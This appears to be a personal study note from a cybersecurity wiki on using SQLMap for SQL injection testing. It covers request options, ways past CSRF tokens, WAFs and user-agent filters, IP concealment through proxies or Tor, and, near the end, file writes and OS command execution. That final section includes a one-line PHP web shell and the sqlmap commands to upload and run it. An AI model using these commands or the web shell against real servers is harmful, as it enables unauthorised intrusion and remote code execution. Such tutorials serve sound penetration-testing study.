---
{"dg-publish":true,"permalink":"/cybersecurity/bug-bounties/sql-injection/sql-map/","tags":["SQLi","SQLInjection","SQL"]}
---


[SQLMap](https://github.com/sqlmapproject/sqlmap) is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws. SQLMap has been continuously developed since 2006 and is still maintained today.

The technique characters `BEUSTQ` refers to the following:

-   `B`: Boolean-based blind
-   `E`: Error-based
-   `U`: Union query-based
-   `S`: Stacked queries
-   `T`: Time-based blind
-   `Q`: Inline queries

## cURL

One good way to use SQLMAP is to "Copy as cURL" from the Network Monitor panel inside the browser, paste the curl command into thet terminal and change "curl" to "sqlmap".

## GET/POST R;equests

**GET** parameters are provided using the -u/--url flags.  For POST requests, use the ```
--data flag.

## Full HTTP Requests

For complex requests use the -r flag with a request captured from Burpsuite or otherwise.  Then run:
	```
```Shell
user@comp$ sqlmap -r req.txt
```

## Custom SQLMap requests

There are numerous switches to learn:

* --cookie
* -H/--header
* etc.
* --random-agent: can be important because it picks identifies as a random agent rather than SQLMap
* --mobile: will make SQLMap identify as a mobile smartphone.

It is possible to test headers for SQLi vulnerabiltiy by using the * marker.  For example: --cookie="id=1*"

## Handling SQLMap Errors

--parse-errors to parse and display DBMS errors.
-t /tmp/traffic.txt to store traffic to an output file.
-v (1-6) to set verbosity level
--proxy to send it through a proxy like burp.

## Fine tuning attacks.

--prefix and --suffix can be used to fine tune attacks.

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```
--level (1-5, default 1) extends the amount of vectors and boundaries used.
--risk (1-3, default 1) extends the vector set based on the risk of denial of service.

Various switches will also allow the fine tuning of SQLMap.


Note: The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user "root", other than that representing the privileged user within the DBMS context. This basically means that the DB user should not have any constraints within the database context, while OS privileges (e.g. file system writing to arbitrary location) should be minimalistic, at least in the recent deployments. The same principle applies for the generic 'DBA' role.

## Bypassing web Application Protections

### Anti-[[Cybersecurity/Bug Bounties/CSRF\|CSRF]] Token Bypass

SQLMap has option:
```bash
--csrf-token
```

If you specify the token parameter (usually found in the request) then SQLMap will try to automatically attempt to parse the responses it gets for new tokens.

```bash
user@box$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

You use the --csrf-token switch to tell SQLMap that the token exists in the data field.  In addition, SQLMap will recognize common token specifiers like: [[Cybersecurity/Bug Bounties/CSRF\|CSRF]], xsrf, and token.

### Unique Value Bypass

Sometimes the website will have a predefined parameter that must be unique. This can be overcome using the option:
```bash
---randomize
```

### Calculated Parameter Bypass

Where a web application expects a proper parameter value be cacluated based on some other parameter values.  Often, one paramaer has to contain the message digest (e.g., **h=MD%(id)**) of another one.
```bash
---eval
```
can be used to bypass this.  Example:
```bash
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5
```

An in-depth write up of the --eval switch is [here](https://infosecwriteups.com/the-mystery-of-sqlmaps-eval-f6c7bf43e1f).

### IP Address Concealing

Can be done via proxy or tor.
```bash
--proxy="socks4://177.38.187.70:33283"
--proxy-file

--tor
--check-tor
```

--tor switch needs [[Cybersecurity/Bug Bounties/TOR\|TOR]] installed properly on the machine.

### [[Cybersecurity/Bug Bounties/Web Application Firewall (WAF)\|Web Application Firewall (WAF)]] bypass

SQLMap will automatically inject a suspicious payload as part of its initial tests to test for the existence of a WAF.  We can skip this test to make the test less noisy by using:
```bash
--skip-waf
```

### User-agent Blacklisting Bypass

One of the firt things to think about when there is a problem.  SQLMap identifies itself as SQLMap (e.g., **User-agent: sqlmap/1.4.9 (http://sqlmap.org)**) so we should consider using the switch **--random-agent** which will change the default user-agent to a randomly chosen pool of values used by browsers.

### Tamper Scripts

Tamper scripts are Python scripts written for modifying requests before thy are sent to a target to make them less detectable (i.e., to bypass protection.)

The list of tampers can be found with the switch:
```bash
--list-tampers
```

tampers are used with the tamper switch:
```bash
--tamper="between"
```


## OS Exploitation

### File Read/Write

Generally, the DB user must have the privilege to **LOAD** **DATA** and **INSERT** to be ablte to load the content of a file to a table and then read the table.

In modern databases it is a common requirement that the user have database administrator (DBA) privileges to do this.

We can check if the user has DBA privileges with the **--is-dba** switch.

### Reading Local Files
We can read files using **--file-read**

### Wrting Local Files

Generally reuires that the --secure-file-priv configuration is disabled to allow writing data into local files using the **INTO OUTFILE** SQL query.  With SQLMap we can try and use the options:
```bash
--file-write
--file-dest
```

Say we have tihs shell as "shell.php":
```php
<?php system($_GET["cmd"]); ?>
```

We could try:
```bash
sqlmap -u "http://www.target.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
Confirm the upload by doing:
```bash
user@comp$ sqlmap -u "http://www.target.com/shell.php?cmd=ls+-la"
```
(We should get the directory contents.)

### OS Command Execution

We use the option:
```bash
--os-shell
```

One of the important lessons of this module was to use dev tools and burpsuite to locate potential injectable pages.go